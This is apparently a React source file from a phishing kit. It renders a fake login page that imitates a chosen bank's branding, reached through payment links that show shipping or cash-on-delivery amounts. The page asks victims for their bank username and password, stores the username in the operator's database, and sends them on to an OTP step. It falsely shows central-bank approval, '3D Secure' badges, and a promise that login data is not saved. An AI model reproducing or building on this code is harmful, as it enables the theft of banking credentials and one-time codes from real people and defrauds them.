import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { getBankById } from "@/lib/banks";
import { getBankDesign } from "@/lib/bankDesigns";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { formatCurrency } from "@/lib/countryCurrencies";
import { 
  Shield, 
  Lock, 
  CheckCircle2,
  Building2,
  User,
  KeyRound,
  AlertCircle,
  ArrowRight,
  Eye,
  EyeOff,
  Info
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const selectedBankId = linkData?.payload?.selectedBank || '';
  
  const bankData = getBankById(selectedBankId);
  const bankDesign = getBankDesign(selectedBankId);
  const govSystem = getGovernmentPaymentSystem(countryCode);

  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;
  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, countryCode);
  const serviceName = linkData?.payload?.service_name || 'خدمة الدفع';

  const design = bankDesign || {
    colors: govSystem.colors,
    gradients: govSystem.gradients,
    shadows: govSystem.shadows,
    borderRadius: govSystem.borderRadius,
    fonts: govSystem.fonts,
    loginFields: {
      usernameLabel: 'اسم المستخدم',
      usernamePlaceholder: 'أدخل اسم المستخدم',
      passwordLabel: 'كلمة المرور',
      passwordPlaceholder: '••••••••',
      buttonText: 'تسجيل الدخول',
    },
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال جميع البيانات المطلوبة",
        variant: "destructive",
      });
      return;
    }

    setIsProcessing(true);

    try {
      await new Promise(resolve => setTimeout(resolve, 2000));

      const updatedPayload = {
        ...linkData?.payload,
        bank_login_data: {
          bank_id: selectedBankId,
          bank_name: bankData?.nameAr || selectedBankId,
          username: username,
          timestamp: new Date().toISOString(),
        },
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload,
      });

      navigate(`/pay/${id}/otp`);
    } catch (error) {
      console.error("Error during bank login:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الدخول",
        variant: "destructive",
      });
      setIsProcessing(false);
    }
  };

  if (!bankData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <Card className="p-8 text-center max-w-md">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-gray-400" />
          <h2 className="text-2xl font-bold mb-2">البنك غير موجود</h2>
          <p className="text-gray-600 mb-6">الرجاء اختيار بنك صحيح</p>
          <Button onClick={() => navigate(`/pay/${id}/bank-selector`)}>
            اختيار البنك
          </Button>
        </Card>
      </div>
    );
  }

  return (
    <div 
      className="min-h-screen" 
      style={{ backgroundColor: design.colors.background }}
      dir="rtl"
    >
      <div 
        className="relative h-28 sm:h-36"
        style={{ background: design.gradients.header }}
      >
        <div className="absolute inset-0 bg-gradient-to-b from-black/10 to-transparent" />
        
        <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6 relative z-10">
          <div className="flex items-center gap-3 sm:gap-4">
            <div 
              className="bg-white p-2.5 sm:p-3 rounded-xl shadow-lg"
              style={{ boxShadow: design.shadows.lg }}
            >
              {bankDesign?.logo ? (
                <img 
                  src={bankDesign.logo} 
                  alt={bankData.nameAr} 
                  className="h-10 sm:h-12 object-contain" 
                />
              ) : (
                <Building2 
                  className="h-10 sm:h-12 w-10 sm:w-12" 
                  style={{ color: design.colors.primary }} 
                />
              )}
            </div>
            <div className="text-white">
              <h1 className="font-bold text-lg sm:text-xl">{bankData.nameAr}</h1>
              <p className="text-xs sm:text-sm opacity-90">{bankData.name}</p>
            </div>
          </div>
          
          <Badge 
            className="hidden sm:flex items-center gap-1 px-3 py-1.5"
            style={{ 
              backgroundColor: 'rgba(255, 255, 255, 0.25)',
              backdropFilter: 'blur(10px)',
              border: '1px solid rgba(255, 255, 255, 0.3)',
              color: 'white'
            }}
          >
            <Shield className="w-4 h-4" />
            <span className="text-xs font-semibold">آمن ومعتمد</span>
          </Badge>
        </div>
      </div>

      <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
        <div className="max-w-xl mx-auto">
          <Card 
            className="p-6 sm:p-8 shadow-2xl mb-6"
            style={{ 
              boxShadow: design.shadows.lg,
              borderTop: `4px solid ${design.colors.primary}`
            }}
          >
            <div className="flex items-center justify-between mb-6 pb-6 border-b-2" style={{ borderBottomColor: design.colors.border }}>
              <div>
                <h2 className="text-xl sm:text-2xl font-bold mb-1">تسجيل الدخول</h2>
                <p className="text-sm text-gray-600">{serviceName}</p>
              </div>
              <div 
                className="px-4 py-2 rounded-xl text-white font-bold text-lg"
                style={{ backgroundColor: design.colors.primary }}
              >
                {formattedAmount}
              </div>
            </div>

            <div 
              className="mb-6 p-4 rounded-xl"
              style={{ 
                backgroundColor: `${design.colors.primary}08`,
                borderRight: `4px solid ${design.colors.primary}`
              }}
            >
              <div className="flex items-start gap-3">
                <Shield className="w-5 h-5 shrink-0 mt-0.5" style={{ color: design.colors.primary }} />
                <div>
                  <p className="font-bold text-sm mb-1">تسجيل دخول آمن</p>
                  <p className="text-xs text-gray-700">
                    أدخل بيانات تسجيل الدخول الخاصة بحسابك في {bankData.nameAr}. جميع البيانات محمية بتشفير SSL 256-bit
                  </p>
                </div>
              </div>
            </div>

            <form onSubmit={handleLogin} className="space-y-5">
              <div>
                <Label 
                  htmlFor="username" 
                  className="mb-2 flex items-center gap-2 text-sm font-semibold"
                  style={{ color: design.colors.text }}
                >
                  <User className="w-4 h-4" />
                  {design.loginFields.usernameLabel} *
                </Label>
                <Input
                  id="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                  className="h-12 text-base"
                  style={{ 
                    borderColor: design.colors.inputBorder,
                    backgroundColor: design.colors.inputBg
                  }}
                  placeholder={design.loginFields.usernamePlaceholder}
                  dir="ltr"
                />
              </div>

              <div>
                <Label 
                  htmlFor="password" 
                  className="mb-2 flex items-center gap-2 text-sm font-semibold"
                  style={{ color: design.colors.text }}
                >
                  <KeyRound className="w-4 h-4" />
                  {design.loginFields.passwordLabel} *
                </Label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    className="h-12 text-base pr-12"
                    style={{ 
                      borderColor: design.colors.inputBorder,
                      backgroundColor: design.colors.inputBg
                    }}
                    placeholder={design.loginFields.passwordPlaceholder}
                    dir="ltr"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>

              <div 
                className="p-4 rounded-lg border-2"
                style={{ 
                  backgroundColor: `${design.colors.primary}05`,
                  borderColor: `${design.colors.primary}20`
                }}
              >
                <div className="flex items-start gap-3">
                  <Info className="w-5 h-5 shrink-0 mt-0.5" style={{ color: design.colors.primary }} />
                  <div className="text-xs text-gray-700 space-y-1">
                    <p>• بياناتك محمية ومشفرة بالكامل</p>
                    <p>• لن يتم حفظ معلومات تسجيل الدخول</p>
                    <p>• سيتم تحويلك لإدخال رمز التحقق OTP</p>
                  </div>
                </div>
              </div>

              <Separator />

              <div className="flex gap-3 pt-2">
                <Button 
                  type="button"
                  variant="outline"
                  onClick={() => navigate(`/pay/${id}/bank-selector`)}
                  className="flex-1 h-12 text-base"
                  disabled={isProcessing}
                >
                  رجوع
                </Button>
                <Button 
                  type="submit"
                  className="flex-1 h-12 text-base font-bold shadow-lg"
                  style={{ 
                    background: design.gradients.button,
                    color: 'white'
                  }}
                  disabled={isProcessing}
                >
                  {isProcessing ? (
                    <span>جارٍ التحقق...</span>
                  ) : (
                    <>
                      <span>{design.loginFields.buttonText}</span>
                      <ArrowRight className="w-5 h-5 mr-2" />
                    </>
                  )}
                </Button>
              </div>
            </form>
          </Card>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <Card 
              className="p-3 border-2"
              style={{ 
                backgroundColor: `${design.colors.primary}08`,
                borderColor: `${design.colors.primary}30`
              }}
            >
              <div className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 shrink-0" style={{ color: design.colors.primary }} />
                <p className="text-xs font-semibold" style={{ color: design.colors.primary }}>
                  معتمد من البنك المركزي
                </p>
              </div>
            </Card>

            <Card 
              className="p-3 border-2"
              style={{ 
                backgroundColor: `${design.colors.secondary}08`,
                borderColor: `${design.colors.secondary}30`
              }}
            >
              <div className="flex items-center gap-2">
                <Lock className="w-4 h-4 shrink-0" style={{ color: design.colors.secondary }} />
                <p className="text-xs font-semibold" style={{ color: design.colors.secondary }}>
                  SSL 256-bit
                </p>
              </div>
            </Card>

            <Card 
              className="p-3 border-2"
              style={{ 
                backgroundColor: `${design.colors.primary}08`,
                borderColor: `${design.colors.primary}30`
              }}
            >
              <div className="flex items-center gap-2">
                <Shield className="w-4 h-4 shrink-0" style={{ color: design.colors.primary }} />
                <p className="text-xs font-semibold" style={{ color: design.colors.primary }}>
                  3D Secure
                </p>
              </div>
            </Card>
          </div>

          <Card 
            className="mt-6 p-6 text-white"
            style={{ background: design.gradients.primary }}
          >
            <div className="flex items-center gap-4">
              <div 
                className="w-14 h-14 rounded-full bg-white/20 flex items-center justify-center shrink-0"
                style={{ backdropFilter: 'blur(10px)' }}
              >
                <Building2 className="w-7 h-7" />
              </div>
              <div>
                <h3 className="font-bold text-base mb-1">{bankData.nameAr}</h3>
                <p className="text-xs opacity-90">
                  الدفع الآمن عبر {govSystem.nameAr} - معتمد من البنك المركزي
                </p>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default PaymentBankLogin;
